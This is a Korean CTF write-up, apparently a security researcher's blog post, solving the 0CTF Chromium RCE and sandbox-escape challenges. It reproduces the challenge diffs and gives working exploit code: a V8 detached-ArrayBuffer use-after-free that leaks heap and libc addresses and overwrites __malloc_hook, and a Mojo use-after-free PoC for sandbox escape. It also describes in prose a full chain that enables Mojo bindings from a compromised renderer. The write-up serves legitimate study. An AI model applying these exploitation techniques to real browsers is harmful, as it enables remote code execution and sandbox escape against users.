---
title: "0ctf Chromium RCE/SBX WriteUp"
author: "NextLine"
comments: true
tags: [pwn, ctf, write-up]
---

라온화이트햇 핵심연구팀 이영주


# 1. Intro

6월 27일부터 29일까지 진행되었던 0CTF 문제중 Chromium RCE, Chromium SBX 문제에 대한 WriteUp입니다. 두 문제는 가장 빠르게 해결하여 퍼블을 먹었습니다.

# 2. RCE : Vulnerability

```diff
diff --git a/src/builtins/typed-array-set.tq b/src/builtins/typed-array-set.tq
index b5c9dcb261..babe7da3f0 100644
--- a/src/builtins/typed-array-set.tq
+++ b/src/builtins/typed-array-set.tq
@@ -70,7 +70,7 @@ TypedArrayPrototypeSet(
     // 7. Let targetBuffer be target.[[ViewedArrayBuffer]].
     // 8. If IsDetachedBuffer(targetBuffer) is true, throw a TypeError
     //   exception.
-    const utarget = typed_array::EnsureAttached(target) otherwise IsDetached;
+    const utarget = %RawDownCast<AttachedJSTypedArray>(target);

     const overloadedArg = arguments[0];
     try {
@@ -86,8 +86,7 @@ TypedArrayPrototypeSet(
       // 10. Let srcBuffer be typedArray.[[ViewedArrayBuffer]].
       // 11. If IsDetachedBuffer(srcBuffer) is true, throw a TypeError
       //   exception.
-      const utypedArray =
-          typed_array::EnsureAttached(typedArray) otherwise IsDetached;
+      const utypedArray = %RawDownCast<AttachedJSTypedArray>(typedArray);

       TypedArrayPrototypeSetTypedArray(
           utarget, utypedArray, targetOffset, targetOffsetOverflowed)
```

핵심적인 diff 코드는 위와 같습니다. 패치는 TypedArrayPrototypeSet 함수에서 되었으며 함수 중간에 detached된 array buffer를 z검사하는 루틴이 제거되었습니다.

```diff
diff --git a/src/parsing/parser-base.h b/src/parsing/parser-base.h
index 3519599a88..f1ba0fb445 100644
--- a/src/parsing/parser-base.h
+++ b/src/parsing/parser-base.h
@@ -1907,10 +1907,8 @@ ParserBase<Impl>::ParsePrimaryExpression() {
       return ParseTemplateLiteral(impl()->NullExpression(), beg_pos, false);

     case Token::MOD:
-      if (flags().allow_natives_syntax() || extension_ != nullptr) {
-        return ParseV8Intrinsic();
-      }
-      break;
+      // Directly call %ArrayBufferDetach without `--allow-native-syntax` flag
+      return ParseV8Intrinsic();

     default:
       break;
```

또한 d8에서 arraybuffer를 바로 detach 할 수 있도록 위 함수 내용이 추가되었습니다.

```jsx
var ab = new ArrayBuffer(0x1000);
var t1 = new Uint8Array(ab);
var t2 = new Uint8Array(0x1000);

t1.fill(1);
t2.fill(2);

t2.set(t1, { valueOf:
    function() {
        %ArrayBufferDetach(ab);
        return 0;
    }
});
```

취약점은 위 코드로 트리거할 수 있습니다. t1의 버퍼를 t2로 복사하는 과정에서 t1의 버퍼를 detach하게 되면 free된 내용의 값이 t2로 복사됩니다.

# 3. RCE : Exploit

```jsx
let convert = new ArrayBuffer(0x8);
let f64 = new Float64Array(convert);
let u32 = new Uint32Array(convert);

function d2u(v) {
    f64[0] = v;
    return u32;
}

function u2d(lo, hi) {
    u32[0] = lo;
    u32[1] = hi;
    return f64[0];
}

function hex(d) {
    let val = d2u(d);
    return ("0x" + (val[1] * 0x100000000 + val[0]).toString(16));
}

/* STAGE 1 */
var ab = new ArrayBuffer(0x1000);
var t1 = new Uint8Array(ab);
var t2 = new Uint8Array(0x1000);

t1.fill(1);
t2.fill(2);

t2.set(t1, { valueOf:
    function() {
        %ArrayBufferDetach(ab);
        return 0;
    }
});

var tmp1 = new Uint32Array(t2.buffer);
let heap = new Uint32Array(new Array(tmp1[0], tmp1[1]));
let libc = new Uint32Array(new Array(tmp1[2], tmp1[3]));
console.log("heap : " + hex(u2d(heap[0], heap[1])));
console.log("libc : " + hex(u2d(libc[0], libc[1])));
```

array buffer의 backing store가 free될때는 ptmalloc의 free를 사용하기 때문에 heap과 libc주소가 chunk에 남습니다. 따라서 그것을 t1의 backgin store로 가져오게 되면 heap, libc 주소를 릭할 수 있습니다.

```jsx
/* STAGE 2 */
var abs = [];
for (var i = 0; i < 7; i++) {
    abs.push( new ArrayBuffer(0x60));
}
var ab2 = new ArrayBuffer(0x60);
var t3 = new Uint8Array(ab2);
var t4 = new Uint8Array(0x8);

var tmp2 = new Uint8Array(libc.buffer);
for (var i = 0; i < 0x10; i++) {
    t4[i] = tmp2[i];
}

value = libc[0] - 0x70 - 0x23;
t4[0x0] = value%0x100;
t4[0x1] = value/0x100;

t3.set(t4, { valueOf:
    function() {
        Date.now();
        for (var i = 0; i < 7; i++) {
            %ArrayBufferDetach(abs[i]);
        }
        %ArrayBufferDetach(ab2);
        return 0;
    }
});
```

UAF 취약점이 존재하는 array buffer의 backing store는 calloc으로 할당되기 때문에 tcache를 사용하지 않기 때문에 tcache를 이용한 exploit은 불가능합니다. 그래서 tcache를 전부 채워서 fastbin을 사용하게 한 뒤, fastbin의 fd를 덮어서  `__malloc_hook` 을 덮으면 rip를 조작할 수 있습니다. 

```jsx
JSON.stringify(ab);
```

여기서 문제가 되는것은 malloc 호출뒤에 원샷조건이 맞지 않는다는 것인데,  여러가지 javascript 함수를 호출하던 도중 JSON.stringify 함수를 호출했을때 원샷 조건이 맞다는 사실을 깨달았습니다. 그래서 이것을 이용해 쉘을 획득할 수 있었습니다.

# 4. SBX : Vulnerability / Exploit

```diff
diff --git a/third_party/blink/public/mojom/tstorage/tstorage.mojom b/third_party/blink/public/mojom/tstorage/tstorage.mojom
new file mode 100644
index 000000000000..c6c8c91905c8
--- /dev/null
+++ b/third_party/blink/public/mojom/tstorage/tstorage.mojom
@@ -0,0 +1,20 @@
+module blink.mojom;
+
+interface TStorage {
+    Init() => ();
+    CreateInstance() => (pending_remote<blink.mojom.TInstance> instance);
+    GetLibcAddress() => (uint64 addr);
+    GetTextAddress() => (uint64 addr);
+};
+
+interface TInstance {
+    Push(uint64 value) => ();
+    Pop() => (uint64 value);
+    Set(uint64 index, uint64 value) => ();
+    Get(uint64 index) => (uint64 value);
+    SetInt(int64 value) => ();
+    GetInt() => (int64 value);
+    SetDouble(double value) => ();
+    GetDouble() => (double value);
+    GetTotalSize() => (int64 size);
+};
```

취약점은 새롭게 추가된 mojo 기능에서 발생합니다. 추가된 기능은 TStorage로, Instance를 생성하여 원하는 값을 넣거나 가져올 수 있습니다. 또한 `GetLibcAddress()` 함수와 `GetTextAddress()` 함수를 통해 libc 주소와 text base 주소를 가져올 수 있었습니다.

```cpp
void TStorageImpl::CreateInstance(CreateInstanceCallback callback) {
    mojo::PendingRemote<blink::mojom::TInstance> instance;
    mojo::MakeSelfOwnedReceiver(std::make_unique<content::TInstanceImpl>(inner_db_.get()),
                                instance.InitWithNewPipeAndPassReceiver());

    std::move(callback).Run(std::move(instance));
}
```

취약점은 CreateInstance 함수에서 발생합니다. TInstance를 생성할 때 인자로 inner_db_를 raw pointer로 전달합니다.

```cpp
#include "content/browser/tstorage/inner_db_impl.h"

namespace content {

InnerDbImpl::InnerDbImpl() {}

InnerDbImpl::~InnerDbImpl() {}

void InnerDbImpl::Push(uint64_t value) {
    queue_.push(value);
}

```

하지만 inner_db_가 free될 때 따로 TInstance에 대한 처리가 없기 때문에 TInstance는 그대로 raw pointer를 가지고 있게 됩니다. 따라서 UAF 취약점이 발생합니다.

```html
<html>
<script src="../mojo_bindings.js"> </script>
<script src="../third_party/blink/public/mojom/tstorage/tstorage.mojom.js"> </script>
<script>
let sptr = new blink.mojom.TStoragePtr();
Mojo.bindInterface(blink.mojom.TStorage.name, mojo.makeRequest(sptr).handle, "context", true);

async functioin main() {
	await sptr.init();
	let ins1 = (await sptr.createInstance()).instance;
	await sptr.ptr.reset();
  // heap spray
	ins1.getTotalSize();
}

main();
</script>
```

위와 같은 코드로 poc를 작성할 수 있습니다. `ins1.getTotalSize();`은 free된 inner_db_를 사용하므로 만약 `getTotalSize` 를 호출하기 전에 heap spray를 통해 inner_db_를 덮어쓴다면 원하는 주소로 rip를 변경할 수 있게 됩니다.

```cpp
namespace content {
    class InnerDbImpl : InnerDb {
    public:
        InnerDbImpl();
        ~InnerDbImpl() override;

        void Push(uint64_t value);
        uint64_t Pop();
        void Set(uint64_t index, uint64_t value);
        uint64_t Get(uint64_t index);
        void SetInt(int64_t value);
        int GetInt();
        void SetDouble(double value);
        double GetDouble();
        uint64_t GetTotalSize() override;

        std::array<uint64_t, 200> array_;
        base::queue<uint64_t> queue_;
        int64_t int_value_ = 0;
        double double_value_ = 0.0;
    };
}
```

또한 InnerDbImpl class를 보면 queue_가 존재하고 기능중에 그 queue_에 값을 push 하거나 pop할 수 있는 기능이 존재합니다. 따라서 free된 InnerDbImpl를 heap spray를 통해 덮어쓴다면 queue_가 내부적으로 가르키고 있는 주소를 변경하여 arbitrary address read/write가 가능해집니다. 그래서 rip를 변경할 수 있는 기능과 원하는 메모리 주소를 읽고 쓸 수 있는 기능을 통해 sandbox를 escape할 수 있습니다.

# 5. Chromium Full Chain

Chromium Full Chain의 경우 대회때 시간이 부족하여 해결하지 못하고 대회가 끝난 뒤에 풀 수 있었습니다. 문제는 위 두가지 exploit을 체이닝하는 문제였는데 바뀐점이 array buffer가 ptmalloc을 사용하지 않게되고 원래 chrome에서 array buffer의 backing store를 할당할 때 사용하는 partition allocator를 사용하게 된 점입니다. 그래서 renderer exploit을 처음부터 새로 작성해야 했습니다.

먼저 취약점을 통해 free된 chunk에 next ptr을 덮어 chunk를 원하는곳에 할당할 수 있었습니다. 하지만 이전과 같이 libc leak이 존재하지 않기 때문에 바로 rip를 컨트롤하는게 불가능했습니다. 그래서 heap leak을 먼저 하고 chunk가 할당된 page 위쪽에 존재하는 slot을 이용해 text 주소를 leak 했습니다.

그리고 leak한 chrome binary 주소중 rw 권한이 있는 영역에 값을 쭉 덮어보면서 rip가 컨트롤 되는 부분을 찾았습니다. 이후 스택 피벗을 통해 ROP를 성공하여 쉘코드를 실행한 뒤에, RenderFrameImpl 객체를 찾아 enabled_bindings_을 2(BINDINGS_POLICY_MOJO_WEB_UI)로 변경하고 새로고침하면 Mojo를 활성화할 수 있었습니다. mojo를 활성화 한 다음엔, 이미 작성 했던 mojo exploit 코드를 그대로 사용하여 sandbox escape를 할 수 있었습니다.

대회 중에는 renderer에서 쉘코드를 실행시키는것까진 성공했지만 쉘코드 실행 이후 다시 정상적인 실행 흐름을 복구하는것에 삽질을 너무 많이해서 못풀었습니다. 시간이 좀 더 있었다면 풀 수 있었을 것 같습니다.